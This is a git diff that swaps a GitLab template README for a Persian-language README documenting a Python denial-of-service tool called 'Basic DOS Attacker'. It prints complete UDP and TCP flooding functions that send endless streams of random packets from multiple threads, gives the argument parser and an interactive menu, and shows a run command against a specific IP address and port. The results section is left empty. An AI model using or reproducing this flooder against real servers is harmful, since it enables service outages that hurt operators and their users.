@@ -1,92 +1,188 @@
-# Basic DOS Attack
+# Basic DOS Attacker
+
+این یک اسکریپت ساده و پایه ای جهت انجام حملات محروم سازی از سرویس است.
+این برنامه از طریق ایجاد سیل هایی از بسته ها و ارسال آن ها به سرور مقصد باعث بالا رفتن لود سرور و در نهایت از کار افتادگی آن می شود.
 
 
+## نصب ابزار مورد نیاز
 
-## Getting started
-
-To make it easy for you to get started with GitLab, here's a list of recommended next steps.
-
-Already a pro? Just edit this README.md and make it your own. Want to make it easy? [Use the template at the bottom](#editing-this-readme)!
-
-## Add your files
-
-- [ ] [Create](https://docs.gitlab.com/ee/user/project/repository/web_editor.html#create-a-file) or [upload](https://docs.gitlab.com/ee/user/project/repository/web_editor.html#upload-a-file) files
-- [ ] [Add files using the command line](https://docs.gitlab.com/ee/gitlab-basics/add-file.html#add-a-file-using-the-command-line) or push an existing Git repository with the following command:
-
-```
-cd existing_repo
-git remote add origin http://188.121.111.248/g10/basic-dos-attack.git
-git branch -M main
-git push -uf origin main
+این پروژه برای اجرا تنها به پایتون ۳ نیاز دارد. در این پروژه تنها از پکیج های داخلی پایتون استفاده شده است و نیازی به نصب پکیج بیرونی نیست.
+لییست پکیج های داخلی به کار رفته در آن به صورت زیر است:
+```bash
+socket
+threading
+random
+time
+argpare
 ```
 
-## Integrate with your tools
+## اجرای اسکریپت
 
-- [ ] [Set up project integrations](http://188.121.111.248/g10/basic-dos-attack/-/settings/integrations)
+برای اجرای اسکریپت کافی است ان را به صورت زیر اجرا کنید:
+```bash
+python main.py -a 188.121.110.10 -p 8085
+```
 
-## Collaborate with your team
+همچنین برای مشاهده راهنمای برنامه و آرگومان های ورودی می توانید از دستور زیر استفاده کنید:
+```bash
+python main.py -h
+```
 
-- [ ] [Invite team members and collaborators](https://docs.gitlab.com/ee/user/project/members/)
-- [ ] [Create a new merge request](https://docs.gitlab.com/ee/user/project/merge_requests/creating_merge_requests.html)
-- [ ] [Automatically close issues from merge requests](https://docs.gitlab.com/ee/user/project/issues/managing_issues.html#closing-issues-automatically)
-- [ ] [Enable merge request approvals](https://docs.gitlab.com/ee/user/project/merge_requests/approvals/)
-- [ ] [Automatically merge when pipeline succeeds](https://docs.gitlab.com/ee/user/project/merge_requests/merge_when_pipeline_succeeds.html)
+برای خاتمه اسکریپت می توانید از سیگنال زیر استفاده کنید:
+```bash
+ctrl + c
+```
 
-## Test and Deploy
+آرگومان های ورودی به صورت زیر تعریف شده است:
+```bash
+usage: main.py [-h] -a ADDRESS [-p PORT] [-c CHOICE] [-m PACKETS] [-t THREADS]
 
-Use the built-in continuous integration in GitLab.
+Basic DOS Attacker
 
-- [ ] [Get started with GitLab CI/CD](https://docs.gitlab.com/ee/ci/quick_start/index.html)
-- [ ] [Analyze your code for known vulnerabilities with Static Application Security Testing(SAST)](https://docs.gitlab.com/ee/user/application_security/sast/)
-- [ ] [Deploy to Kubernetes, Amazon EC2, or Amazon ECS using Auto Deploy](https://docs.gitlab.com/ee/topics/autodevops/requirements.html)
-- [ ] [Use pull-based deployments for improved Kubernetes management](https://docs.gitlab.com/ee/user/clusters/agent/)
-- [ ] [Set up protected environments](https://docs.gitlab.com/ee/ci/environments/protected_environments.html)
+optional arguments:
+  -h, --help  show this help message and exit
+  -a ADDRESS  Hostname or IP address
+  -p PORT     Port, default 80
+  -c CHOICE   UDP or TCP, default UPD
+  -m PACKETS  Num of packets in a socket, default 10
+  -t THREADS  Num of threads, default 2
+```
 
-***
+همچنین یک منو تعاملی با رابط ترمینال نیز فراهم شده است. برای اجرای آن می توانید از دستور زیر استفاده کنید
+```bash
+python menu.py
+```
 
-# Editing this README
 
-When you're ready to make this README your own, just edit this file and use the handy template below (or feel free to structure it however you want - this is just a starting point!).  Thank you to [makeareadme.com](https://www.makeareadme.com/) for this template.
+## توضیح اسکریپت
 
-## Suggestions for a good README
-Every project is different, so consider which of these sections apply to yours. The sections used in the template are suggestions for most open source projects. Also keep in mind that while a README can be too long and detailed, too long is better than too short. If you think your README is too long, consider utilizing another form of documentation rather than cutting out information.
+نحوه ایجاد جریان یو دی پی در کد زیر وجود دارد که در ادامه کد توضیح داده خواهد شد.
+```python
+def udp_flooder(thread_number, ip, port, packets):
+    data = random._urandom(1024)
+    s = None
+    while True:
+        try:
+            # UDP = SOCK_DGRAM
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            address = (str(ip), int(port))
+            for _ in range(packets):
+                s.sendto(data, address)
+            s.close()
+            print(f"[{thread_number}] {packets} UDP packet sent")
+        except (KeyboardInterrupt, socket.error):
+            s.close()
+            print(f"[{thread_number}] Error!")
+```
+این تابع چهار ورودی دارد که ورودی اول آن شماره رشته پردازشی مسئول است.
+ورودی دوم آدرس سرور مقصد است.
+ورودی سوم شماره پورت سرور مقصد است.
+ورودی چهارم تعداد بسته های درون هر اتصال یو دی پی است.
+ابتدا یک داده با طول 1024 به صورت رندوم تولید می شود.
+سپس در یک حلقه بی نهایت یک ساکت از نوع یو دی پی ساخته می شود.
+با اتصال آی پی و پورت آدرس کامل به دست می آید.
+سپس در اتصال ساکت به تعداد بسته های مطلوب بسته ارسال می کنیم.
+در نهایت اتصال را می بندیم و لاگ آن را چاپ می کنیم.
 
-## Name
-Choose a self-explaining name for your project.
 
-## Description
-Let people know what your project can do specifically. Provide context and add a link to any reference visitors might be unfamiliar with. A list of Features or a Background subsection can also be added here. If there are alternatives to your project, this is a good place to list differentiating factors.
+نحوه ایجاد جریان تی سی پی در کد زیر وجود دارد که در ادامه کد توضیح داده خواهد شد.
+```python
+def tcp_flooder(thread_number, ip, port, packets):
+    data = random._urandom(16)
+    s = None
+    while True:
+        try:
+            # TCP = SOCK_STREAM
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip, port))
+            s.send(data)
+            for _ in range(packets):
+                s.send(data)
+            print(f"[{thread_number}] {packets} TCP packet sent")
+            s.close()
+        except (KeyboardInterrupt, socket.error):
+            s.close()
+            print(f"[{thread_number}] Error!")
+```
+این تابع چهار ورودی دارد که ورودی اول آن شماره رشته پردازشی مسئول است.
+ورودی دوم آدرس سرور مقصد است.
+ورودی سوم شماره پورت سرور مقصد است.
+ورودی چهارم تعداد بسته های درون هر اتصال تی سی پی است.
+ابتدا یک داده با طول 16 به صورت رندوم تولید می شود.
+سپس در یک حلقه بی نهایت یک ساکت از نوع تی سی پی ساخته می شود.
+با اتصال آی پی و پورت آدرس کامل به دست می آید.
+سپس اتصال تی سی پی برقرار می شود. مشاهده شد که در حالت تی سی پی نیاز به اتصال بودیم اما در یو دی پی اینطور نبود.
+سپس در اتصال ساکت به تعداد بسته های مطلوب بسته ارسال می کنیم.
+در نهایت اتصال را می بندیم و لاگ آن را چاپ می کنیم.
 
-## Badges
-On some READMEs, you may see small images that convey metadata, such as whether or not all the tests are passing for the project. You can use Shields to add some to your README. Many services also have instructions for adding a badge.
+تابع زیر با گرفتن نوع اتصال تابع تولید کننده جریان را خروجی می دهد.
+از این تابع برای انتخاب جریان ساز درون مدیر رشته های پردازشی استفاده خواهد شد.
+```python
+def flooder_selector(choice):
+    if choice == "UDP":
+        return udp_flooder
+    elif choice == "TCP":
+        return tcp_flooder
+    else:
+        return None
+```
 
-## Visuals
-Depending on what you are making, it can be a good idea to include screenshots or even a video (you'll frequently see GIFs rather than actual videos). Tools like ttygif can help, but check out Asciinema for a more sophisticated method.
+یک تابع برای مدیریت رشته های پردازشی ایجاد شده است.
+```python
+def thread_manager(threads, flooder, ip, port, packets):
+    for i in range(threads):
+        th = threading.Thread(target=flooder, daemon=True, args=(i, ip, port, packets))
+        th.start()
+```
+این تابع چهار ورودی دارد که ورودی اول آن شماره رشته پردازشی مسئول است.
+ورودی دوم آدرس سرور مقصد است.
+ورودی سوم شماره پورت سرور مقصد است.
+ورودی چهارم تعداد بسته های درون هر اتصال تی سی پی است.
+سپس به تعداد رشته های پردازشی مورد نیاز رشته حاوی جریان تولید می شود.
+رشته های ساخته شده از نوع دیمن می باشند که در پشت صحنه رشته اصلی اجرا می شود و دارای اولویت کمتری نسبت به آن است. هنگامی که رشته اصلی از بین می رود تمامی رشته های دیمن نیز از بین خواهند رفت.
 
-## Installation
-Within a particular ecosystem, there may be a common way of installing things, such as using Yarn, NuGet, or Homebrew. However, consider the possibility that whoever is reading your README is a novice and would like more guidance. Listing specific steps helps remove ambiguity and gets people to using your project as quickly as possible. If it only runs in a specific context like a particular programming language version or operating system or has dependencies that have to be installed manually, also add a Requirements subsection.
 
-## Usage
-Use examples liberally, and show the expected output if you can. It's helpful to have inline the smallest example of usage that you can demonstrate, while providing links to more sophisticated examples if they are too long to reasonably include in the README.
+در نهایت یک تابع اصلی برای تجزیه آرگومان های ورودی و اجرای توابع بالا ایجاد شده است.
+```python
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description='Basic DOS Attacker')
+    parser.add_argument("-a", dest="address", required=True, help="Hostname or IP address")
+    parser.add_argument("-p", dest="port", default=80, type=int, help="Port, default 80")
+    parser.add_argument("-c", dest="choice", default="UDP", help="UDP or TCP, default UPD")
+    parser.add_argument("-m", dest="packets", default=10, type=int, help="Num of packets in a socket, default 10")
+    parser.add_argument("-t", dest="threads", default=2, type=int, help="Num of threads, default 2")
+    args = parser.parse_args()
 
-## Support
-Tell people where they can go to for help. It can be any combination of an issue tracker, a chat room, an email address, etc.
+    ip = args.address
+    port = args.port
+    choice = args.choice
+    packets = args.packets
+    threads = args.threads
 
-## Roadmap
-If you have ideas for releases in the future, it is a good idea to list them in the README.
+    flooder = flooder_selector(choice)
+    thread_manager(threads, flooder, ip, port, packets)
 
-## Contributing
-State if you are open to contributions and what your requirements are for accepting them.
+    while True:
+        time.sleep(2)
+```
+در انتهای این تابع یک حلقه بی نهایت ایجاد شده است تا رشته اصلی تمام نشود.
+زیرا اگر این رشته تمام شود تمام زیر رشته های دیمن آن نیز خاتمه می یابند.
 
-For people who want to make changes to your project, it's helpful to have some documentation on how to get started. Perhaps there is a script that they should run or some environment variables that they need to set. Make these steps explicit. These instructions could also be useful to your future self.
+تابع منو نیز مشابه تابع بالا است اما به صورت تعامل از طریق ترمینال:
+```python
+if __name__ == '__main__':
+    ip = str(input("Hostname or IP address: "))
+    port = int(input("Port: "))
+    choice = str(input("UDP or TCP: "))
+    packets = int(input("Num of packets in a socket: "))
+    threads = int(input("Num of threads: "))
 
-You can also document commands to lint the code or run tests. These steps help to ensure high code quality and reduce the likelihood that the changes inadvertently break something. Having instructions for running tests is especially helpful if it requires external setup, such as starting a Selenium server for testing in a browser.
+    flooder = flooder_selector(choice)
+    thread_manager(threads, flooder, ip, port, packets)
 
-## Authors and acknowledgment
-Show your appreciation to those who have contributed to the project.
+    while True:
+        time.sleep(2)
+```
 
-## License
-For open source projects, say how it is licensed.
 
-## Project status
-If you have run out of energy or time for your project, put a note at the top of the README saying that development has slowed down or stopped completely. Someone may choose to fork your project or volunteer to step in as a maintainer or owner, allowing your project to keep going. You can also make an explicit request for maintainers.
+## نتایج
